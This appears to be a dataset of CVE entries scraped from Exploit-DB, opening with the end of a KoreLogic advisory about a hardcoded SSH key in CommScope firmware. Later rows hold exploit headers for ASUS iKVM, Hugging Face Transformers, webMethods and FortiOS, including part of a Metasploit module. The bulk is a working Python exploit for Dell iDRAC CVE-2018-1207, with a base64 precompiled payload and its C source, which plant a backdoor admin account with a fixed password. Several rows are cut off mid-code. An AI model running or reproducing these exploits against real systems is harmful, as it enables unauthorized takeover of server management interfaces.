business days have elapsed since the vulnerability was reported to CommScope. 2021.05.17 - CommScope notifies KoreLogic that the patched version of the firmware will be available the week of 2021.05.24. 2021.05.19 - KoreLogic requests CVE from MITRE. 2021.05.19 - MITRE issues CVE-2021-33216. 2021.05.25 - CommScope releases firmware 1.8.0.0 and associated advisory. 2021.05.26 - KoreLogic public disclosure. 7. Proof of Concept With the VMDK file mounted at the current working directory: $ find . -name authorized_keys ./VRIOT/ap-images/authorized_keys ./VRIOT/ops/ap-images/authorized_keys $ cat VRIOT/ap-images/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCp1X4UH+0IALnLKsqbSZwgbzA1clXWXguNpTZ+Km7irkMaXVRt6IL78mdK+nKUvvQcRnAhQ0TgoqINrdLzMTYwoVaOcBq5Lw21A5JrP8IQANMAiVSM30umJYuTqnbPO4HHIi9/Gk/wUtJiwvD/ygNx7z0g1a9PIzQxOITLpwVkEU2iDdlrZDHR35jI/ddRRsbPe9ezeYGDoprgQagw634fa9tzI74oj5/Xh64679yjA0bQx+i8ZXSIHFPSHp0yiDyMZfvLIqdqb0mEAN1JnaHfIiq4o8/wa8zp7nVADo6Pxweklc1kqALFUxrzdP/6Z0hITp1Ke/xdA2S4LT3ye85QVM/k3Dd54qFpMAJsinYb18Ykyj0PTZskcBWB+l9VevpJXv+3DDH2+98Ledv/fnXQ9VapxW572fX2HkEoh4Nmt5VUx0JPR/0onwOVeuwQLp5qnHxmzgL8DMS62QkTT1VdaCqXS01DMPorKQUtmvAxohJUJX4df9JoOcwRpvKSspn+6UU1krPZHX1QYvPrRsfYhJ9SCzrVxmuC0DR3FqxGoix5su4DqCpRxq0QhwC4+DwIMt4KTIjF3p35s+bjP1luwITJOxVlIswpyZKS0hITFLJtAE7c493wX7hxUdy+LfyHXlMIoJcYM11WXLAysHcWyfmSpQ8H5GV0vxela0Qg7Q== chandini.venkatesh@commscope.com $ cat VRIOT/ops/ap-images/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCp1X4UH+0IALnLKsqbSZwgbzA1clXWXguNpTZ+Km7irkMaXVRt6IL78mdK+nKUvvQcRnAhQ0TgoqINrdLzMTYwoVaOcBq5Lw21A5JrP8IQANMAiVSM30umJYuTqnbPO4HHIi9/Gk/wUtJiwvD/ygNx7z0g1a9PIzQxOITLpwVkEU2iDdlrZDHR35jI/ddRRsbPe9ezeYGDoprgQagw634fa9tzI74oj5/Xh64679yjA0bQx+i8ZXSIHFPSHp0yiDyMZfvLIqdqb0mEAN1JnaHfIiq4o8/wa8zp7nVADo6Pxweklc1kqALFUxrzdP/6Z0hITp1Ke/xdA2S4LT3ye85QVM/k3Dd54qFpMAJsinYb18Ykyj0PTZskcBWB+l9VevpJXv+3DDH2+98Ledv/fnXQ9VapxW572fX2HkEoh4Nmt5VUx0JPR/0onwOVeuwQLp5qnHxmzgL8DMS62QkTT1VdaCqXS01DMPorKQUtmvAxohJUJX4df9JoOcwRpvKSspn+6UU1krPZHX1QYvPrRsfYhJ9SCzrVxmuC0DR3FqxGoix5su4DqCpRxq0QhwC4+DwIMt4KTIjF3p35s+bjP1luwITJOxVlIswpyZKS0hITFLJtAE7c493wX7hxUdy+LfyHXlMIoJcYM11WXLAysHcWyfmSpQ8H5GV0vxela0Qg7Q== chandini.venkatesh@commscope.com $ grep ""ap-images"" etc/passwd vriotiotupgrade:x:1002:1002::/VRIOT/ap-images/:/usr/bin/rssh $ tail -8 etc/ssh/sshd_config Match User vriotiotupgrade PasswordAuthentication no AuthorizedKeysFile /VRIOT/ap-images/authorized_keys Match User vriotha PasswordAuthentication yes $ grep -v ^# etc/rssh.conf logfacility = LOG_USER allowscp umask = 022 The contents of this advisory are copyright(c) 2021 KoreLogic, Inc. and are licensed under a Creative Commons Attribution Share-Alike 4.0 (United States) License: http://creativecommons.org/licenses/by-sa/4.0/ KoreLogic, Inc. is a founder-owned and operated company with a proven track record of providing security services to entities ranging from Fortune 500 to small and mid-sized companies. We are a highly skilled team of senior security consultants doing by-hand security assessments for the most important networks in the U.S. and around the world. We are also developers of various tools and resources aimed at helping the security community. https://www.korelogic.com/about-korelogic.html Our public vulnerability disclosure policy is available at: https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.3.txt"
CVE-2023-26602,2025-04-16,exploit db,"# Exploit Title: ASUS ASMB8 iKVM 1.14.51 - Remote Code Execution (RCE) # Date: 2023-02-16 # Exploit Author: d1g@segfault.net for NetworkSEC [NWSSA-002-2023], SC # Vendor Homepage: https://servers.asus.com/search?q=ASMB8 # Version/Model: ASMB8 iKVM Firmware <= 1.14.51 (probably others) # Tested on: Linux AMI2CFDA1C7570E 2.6.28.10-ami armv5tejl # CVE: CVE-2023-26602 0x00 DESCRIPTION During a recent engagement, a remote server management interface has been discovered. Furthermore, SNMPv2 was found to be enabled, offering write access to the private community, subsequently allowing us to introduce SNMP arbitrary extensions to achieve RCE. We also found a hardcoded account sysadmin:superuser by cracking the shadow file (md5crypt) found on the system and identifed an ""anonymous"" user w/ the same password, however a lock seems to be in place to prevent using these credentials via SSH (running defshell as default shell). 0x01 IMPACT By exploiting SNMP arbitrary extension, we are able to run any command on the system w/ root privileges, and we are able to introduce our own user circumventing the defshell restriction for SSH. 0x02 PROOF OF CONCEPT ("
CVE-2024-11392,2025-04-16,exploit db,"# Exploit Title: Hugging Face Transformers MobileViTV2 RCE # Date: 29-11-2024 # Exploit Author: The Kernel Panic # Vendor Homepage: https://huggingface.co/ # Software Link: https://github.com/huggingface/transformers/releases # Version: 4.41.1 # Tested on: Linux, Windows, Mac # CVE : CVE-2024-11392 # Code flow from input to the vulnerable condition: # 1. The user downloads a third-party ml-cvnet model alongside its configuration file. # 2. The user runs the convert_mlcvnets_to_pytorch.py script and passes the configuration file to it. # 3. The convert_mlcvnets_to_pytorch.py script de-serializes the configuration file and executes the malicious code."
CVE-2024-23733,2025-04-16,exploit db,"# Exploit Title: WebMethods Integration Server 10.15.0.0000-0092 - Improper Access on Login Page # Date: 25-01-2024 # Exploit Author: Rasime Ekici # Vendor Homepage: www.softwareag.com # Version: 10.15.0000-0092 # Tested on: 10.15.0000-0092 # CVE : 2024-23733 Description: The /WmAdmin/,/invoke/vm.server/login login page in the Integration Server in Software AG webMethods 10.15.0 before Core Fix7 allows remote attackers to reach the administration panel,discovering server hostname and version information by sending arbitary username and blank password to the /WmAdmin/#/login/ uri Interpret the http traffic and send a dummy username with blank password on login screen and drop the request to ""/admin/navigation/license"" to not logged out.Thus you may able to see: -real hostname of the installed server -version info -administrative api endpoints"
CVE-2022-40684,2025-04-16,exploit db,"# Exploit Title: Fortinet FortiOS, FortiProxy, and FortiSwitchManager 7.2.0 - Authentication bypass # Date: 2022-10-10 # Exploit Author: Zach Hanley, SC # Vendor Homepage: https://www.fortinet.com # Version: 7.0.0 # Tested on: Linux # CVE : CVE-2022-40684 # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::Remote::SSH prepend Msf::Exploit::Remote::AutoCheck attr_accessor :ssh_socket def initialize(info = {}) super( update_info( info, 'Name' => 'Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.', 'Description' => %q{ This module exploits an authentication bypass vulnerability in the Fortinet FortiOS, FortiProxy, and FortiSwitchManager API to gain access to a chosen account. And then add a SSH key to the authorized_keys file of the chosen account, allowing to login to the system with the chosen account. Successful exploitation results in remote code execution. 'Author' => [ 'Heyder Andrade <@HeyderAndrade>', # Metasploit module 'Zach Hanley <@hacks_zach>', #"
CVE-2018-1207,2025-04-16,exploit db,"# Exploit Title: Dell EMC iDRAC7/iDRAC8 2.52.52.52 - Remote Code Execution (RCE) via file upload # Date: 2024-08-28 # Exploit Author: Photubias # Vendor Homepage: https://dell.com # Vendor Advisory: [1] https://dl.dell.com/manuals/all-products/esuprt_solutions_int/esuprt_solutions_int_solutions_resources/dell-management-solution-resources_White-Papers6_en-us.pdf # Version: integrated Dell Remote Access Console v7 & v8 < 2.52.52.52 # Tested on: iDRAC 7 & 8 # CVE: CVE-2018-1207 r''' Copyright 2024 Photubias(c) This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see . File name CVE-2018-1207.py written by Photubias CVE-2018-1207 is an unauthenticated file upload and so library execution vulnerability on the HTTPS web interface. This exploit contains a checker and a builtin exploit to add a webuser for remote admin access # Manual verification example, if libraries are returned, the target is vulnerable: # curl -ik ""http://192.168.1.100//cgi-bin/login?LD_DEBUG=files"" Feel free to scan your network via the iDRAC fingerprinter to find vulnerable systems: https://github.com/tijldeneut/Security/blob/master/iDRAC-fingerprinter.py This is a native implementation, written in Python 3 and only requires requests (pip3 install requests) Works equally well on Windows as Linux (as MacOS, probably ;-) Features: vulnerability checker + exploit WARNING: The built-in payload is precompiled and does this: - Configure USER ID 13 with username 'user', password 'Passw0rd' and as an iDRAC webadmin - Any user that might be at ID 13 will be overridden and is unrecoverable - TIP1: use racadm for command line access after exploitation (also uses TCP/443) - TIP2: use racadm to retrieve user hash with command: racadm -r -u user -p Passw0rd get iDRAC.Users.2 import requests, optparse, base64, struct, time requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) requests.warnings.filterwarnings('ignore', category=DeprecationWarning) iTimeout = 10 sPayloadCode ='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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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' #> For the source code of this pre-compiled C code, see below ## Main program class CustomHTTPAdapter(requests.adapters.HTTPAdapter): def init_poolmanager(self, *args, **kwargs): context = requests.ssl.create_default_context() context.set_ciphers('ALL:@SECLEVEL=0') context.check_hostname = False context.minimum_version = requests.ssl.TLSVersion.SSLv3 super().init_poolmanager(*args, **kwargs, ssl_context=context) def callURL(sURL, oSession, bData=None, lstProxies={}, boolVerbose=False): try: if bData: oResponse = oSession.post(sURL, data=bData, proxies=lstProxies, verify=False) ## Removed timeout here, as it may take a long time to upload files else: oResponse = oSession.get(sURL, proxies=lstProxies, verify=False, timeout = iTimeout) except: oResponse = None return oResponse def checkVuln(sIP, oSession, lstProxies={}, boolVerbose=False): oResponse = callURL(f'https://{sIP}/cgi-bin/login?LD_DEBUG=files', oSession, lstProxies = lstProxies) if not oResponse is None and 'calling init: /lib/' in oResponse.text: if boolVerbose: print('[*] Data returned: ') print(oResponse.text) return True return False def uploadAndRunLibrary(bData, oSession, sIP, lstProxies, boolVerbose=False): iFFLAGS = 1 bFAlias = b'RACPKSSHAUTHKEY1' bLib = bFAlias + (32 - len(bFAlias))*b'\0' bLib += struct.pack(' #include static void main(void) __attribute__((constructor)); static void main(void) int pid1 = fork(); if(!pid1) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminUserName"", ""user"", (char*) NULL); int pid2 = fork(); if(!pid2) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminPassword"", ""Passw0rd"", (char*) NULL); int pid3 = fork(); if(!pid3) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminPrivilege"", ""0x000001ff"", (char*) NULL); int pid4 = fork(); if(!pid4) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminEnable"", ""1"", (char*) NULL);"
CVE-2022-4407,2025-04-16,exploit db,# Exploit Title: phpMyFAQ 3.1.7 - Reflected Cross-Site Scripting (XSS) # Date: 2024-10-26 # Exploit Author: CodeSecLab # Vendor Homepage: https://github.com/thorsten/phpMyFAQ # Software Link: https://github.com/thorsten/phpMyFAQ # Version: 3.1.7 # Tested on: Ubuntu Windows # CVE : CVE-2022-4407
